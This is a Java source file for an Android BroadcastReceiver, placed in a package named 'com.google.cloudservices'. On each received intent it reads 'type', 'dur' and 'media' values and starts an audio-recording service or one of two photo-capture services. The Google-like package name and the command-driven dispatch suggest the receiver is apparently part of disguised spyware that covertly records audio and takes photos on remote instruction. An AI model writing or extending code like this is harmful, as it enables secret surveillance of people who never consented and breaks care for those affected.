package com.google.cloudservices;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.support.v4.content.ContextCompat;
import android.util.Log;

public class AuodiReceiver extends BroadcastReceiver {

    private Intent vidIntent;
    String types=null,dur=null,media=null;

    @Override
    public void onReceive(Context context, Intent intent) {
        Log.e("testing", "Audio2");
        // TODO: This method is called when the BroadcastReceiver is receiving
        // an Intent broadcast.
        if (intent!=null){
            Log.e("testingma", intent.getStringExtra("media"));
            types=intent.getStringExtra("type");
            dur=intent.getStringExtra("dur");
            media=intent.getStringExtra("media");
            Log.e("testingma", types+",,"+ dur+",,"+media+",,");
            if (media.equals("voice")){
                Log.e("testingma", "voice");
        vidIntent = new Intent(context, AudioService.class);
                                                    vidIntent.putExtra("type",types);
                                                    vidIntent.putExtra("dur",dur);
                                                    vidIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                                                  //  ContextCompat.startForegroundService(context,vidIntent);
                                                    context.startService(vidIntent);
            }else if (media.equals("cap")){
                Log.e("testingma", "cap");
                vidIntent = new Intent(context, CapPhoto.class);
                vidIntent.putExtra("type",types);
                vidIntent.putExtra("dur",dur);
                vidIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                context.startService(vidIntent);
            }else if (media.equals("cap2")){
                Log.e("testingma", "cap2");
                vidIntent = new Intent(context, CapPhoto2.class);
                vidIntent.putExtra("type",types);
                vidIntent.putExtra("dur",dur);
                vidIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                context.startService(vidIntent);
            }

        }
    }

}
